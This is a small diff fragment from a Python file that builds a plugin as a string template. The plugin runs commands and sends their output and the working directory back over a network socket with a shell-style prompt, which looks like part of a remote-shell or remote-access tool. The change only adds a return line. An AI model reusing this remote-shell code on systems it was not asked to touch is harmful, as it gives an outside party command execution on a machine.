@@ -67,5 +67,6 @@ def run(port):
             output_bytes = cmd.stdout.read()
             client.send(output_bytes + str(os.getcwd()) + '$')
     client.close()
+    return 'None'
 ''' % port
     return plugin
